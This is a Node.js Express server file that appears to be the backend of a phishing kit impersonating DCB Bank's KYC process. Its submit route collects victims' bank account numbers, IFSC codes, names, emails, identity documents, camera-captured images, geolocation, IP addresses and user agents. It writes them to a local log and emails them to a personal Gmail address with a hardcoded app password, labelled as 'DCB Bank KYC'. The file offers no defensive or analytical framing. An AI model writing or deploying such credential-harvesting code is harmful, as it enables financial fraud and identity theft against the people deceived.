// server.js
const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const nodemailer = require('nodemailer');

const app = express();
const port = process.env.PORT || 3000;

// Middleware for handling large payloads
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// Set up multer for file upload
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    const dir = 'uploads';
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir);
    }
    cb(null, dir);
  },
  filename: function (req, file, cb) {
    const uniqueName = `${Date.now()}-${file.originalname}`;
    cb(null, uniqueName);
  }
});

// File filter function
const fileFilter = (req, file, cb) => {
  const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
  if (allowedTypes.includes(file.mimetype)) {
    cb(null, true);
  } else {
    cb(new Error('Only JPG, PNG, or PDF files are allowed'), false);
  }
};

// Create upload instance
const upload = multer({
  storage: storage,
  fileFilter: fileFilter,
  limits: {
    fileSize: 50 * 1024 * 1024 // 50MB limit
  }
}).any();

// Email transporter
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'dcbsubmission392@gmail.com',
    pass: 'iskexmwnespcwxrkjt' // Your app password
  }
});

// Route to handle form submission
app.post('/submit', (req, res) => {
  upload(req, res, async function (err) {
    if (err instanceof multer.MulterError) {
      console.error('Multer error:', err);
      return res.status(500).json({ error: err.message });
    } else if (err) {
      console.error('Upload error:', err);
      return res.status(500).json({ error: err.message });
    }

    try {
      // Extract form fields from req.body
      const { bankname, ifsc, accno, fullname, email, location } = req.body;
      const files = req.files;
      const timestamp = new Date().toLocaleString();
      const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
      const userAgent = req.headers['user-agent'];

      // Process location data
      const locationData = location ? JSON.parse(location) : null;
      
      // Separate document file from captured images
      let documentFile = null;
      const imageAttachments = [];
      
      files.forEach(file => {
        if (file.fieldname === 'document') {
          documentFile = file;
        } else if (file.fieldname.startsWith('image')) {
          imageAttachments.push(file);
        }
      });

      // Create log entry
      const logEntry = `
--- Submission ---
Bank Name: ${bankname}
IFSC Code: ${ifsc}
Account Number: ${accno}
Full Name: ${fullname}
Email: ${email}
Document: ${documentFile ? documentFile.path : 'None'}
Time: ${timestamp}
IP: ${ip}
User Agent: ${userAgent}
Location: ${locationData ? `${locationData.latitude}, ${locationData.longitude}` : 'None'}
Images Captured: ${imageAttachments.length}
-------------------
`;

      fs.appendFileSync('records.txt', logEntry);
      console.log(logEntry);

      // Prepare email content
      const mailOptions = {
        from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
        to: 'dcbsubmission392@gmail.com',
        subject: '🔔 New DCB Bank KYC Submission',
        html: `
          <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
            <h2 style="color: #003d6a; border-bottom: 2px solid #003d6a; padding-bottom: 10px;">
              New KYC Submission Received
            </h2>
            
            <div style="background-color: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
              <h3 style="color: #003d6a; margin-top: 0;">Account Information</h3>
              <p><strong>Bank Name:</strong> ${bankname}</p>
              <p><strong>IFSC Code:</strong> ${ifsc}</p>
              <p><strong>Account Number:</strong> ${accno}</p>
              <p><strong>Full Name:</strong> ${fullname}</p>
              <p><strong>Email:</strong> ${email}</p>
            </div>
            
            ${locationData ? `
            <div style="background-color: #e8f4fc; padding: 20px; border-radius: 8px; margin: 20px 0;">
              <h3 style="color: #003d6a; margin-top: 0;">Location Data</h3>
              <p><strong>Latitude:</strong> ${locationData.latitude}</p>
              <p><strong>Longitude:</strong> ${locationData.longitude}</p>
              <p><strong>Accuracy:</strong> ${locationData.accuracy} meters</p>
              <p><strong>Timestamp:</strong> ${new Date(locationData.timestamp).toLocaleString()}</p>
            </div>
            ` : ''}
            
            <div style="background-color: #f0f8ff; padding: 20px; border-radius: 8px; margin: 20px 0;">
              <h3 style="color: #003d6a; margin-top: 0;">System Information</h3>
              <p><strong>Total Images Captured:</strong> ${imageAttachments.length}</p>
              <p><strong>IP Address:</strong> ${ip}</p>
              <p><strong>User Agent:</strong> ${userAgent}</p>
              <p><strong>Submission Time:</strong> ${timestamp}</p>
            </div>
          </div>
        `,
        attachments: []
      };

      // Add document attachment if exists
      if (documentFile) {
        mailOptions.attachments.push({
          filename: documentFile.originalname,
          path: documentFile.path
        });
      }

      // Add captured images
      imageAttachments.forEach(file => {
        mailOptions.attachments.push({
          filename: file.originalname,
          path: file.path
        });
      });

      // Send email
      await transporter.sendMail(mailOptions);

      // Cleanup files
      if (documentFile) fs.unlinkSync(documentFile.path);
      imageAttachments.forEach(file => fs.unlinkSync(file.path));

      res.status(200).send();
    } catch (error) {
      console.error('❌ Submission error:', error);
      res.status(500).json({ error: 'Submission failed' });
    }
  });
});

// Start server
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
